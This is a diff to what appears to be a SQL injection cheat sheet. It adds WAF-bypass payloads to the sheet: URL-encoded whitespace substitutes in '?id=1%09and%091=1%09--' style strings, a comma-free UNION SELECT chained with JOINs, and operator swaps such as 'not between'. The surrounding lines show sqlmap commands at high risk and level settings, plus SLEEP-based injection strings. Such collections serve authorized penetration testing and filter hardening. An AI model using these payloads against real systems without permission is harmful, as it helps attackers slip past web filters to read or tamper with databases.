@@ -33,6 +33,7 @@ sqlmap --url="<url>" -p username --user-agent=SQLMAP --threads=10 --risk=3 --lev
 Custom injection in UserAgent/Header/Referer/Cookie
 ```
 python sqlmap.py -u "http://example.com" --data "username=admin&password=pass"  --headers="x-forwarded-for:127.0.0.1*"
+The injection is located at the '*'
 ```
 
 General tamper option and tamper's list
@@ -176,6 +177,16 @@ SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/
 
 ## WAF Bypass
 
+No Space (%20) - bypass using whitespace alternatives
+```
+?id=1%09and%091=1%09--
+?id=1%0Dand%0D1=1%0D--
+?id=1%0Cand%0C1=1%0C--
+?id=1%0Band%0B1=1%0B--
+?id=1%0Aand%0A1=1%0A--
+?id=1%A0and%A01=1%A0--
+```
+
 No Whitespace - bypass using comments
 ```
 ?id=1/*comment*/and/**/1=1/**/--
@@ -186,10 +197,11 @@ No Whitespace - bypass using parenthesis
 ?id=(1)and(1)=(1)--
 ```
 
-No Comma - bypass using OFFSET and FROM
+No Comma - bypass using OFFSET, FROM and JOIN
 ```
-LIMIT 0,1 -> LIMIT 1 OFFSET 0
+LIMIT 0,1         -> LIMIT 1 OFFSET 0
 SUBSTR('SQL',1,1) -> SUBSTR('SQL' FROM 1 FOR 1). 
+SELECT 1,2,3,4    -> UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d
 ```
 
 Blacklist using keywords - bypass using uppercase/lowercase
@@ -199,11 +211,12 @@ Blacklist using keywords - bypass using uppercase/lowercase
 ?id=1 aNd 1=1#
 ```
 
-Blacklist using keywords case insensitive - bypass using equivalent
+Blacklist using keywords case insensitive - bypass using an equivalent operator
 ```
 AND   -> &&
 OR    -> ||
 =     -> LIKE,REGEXP, not < and not >
+> X   -> not between 0 and X
 WHERE -> HAVING
 ```
 
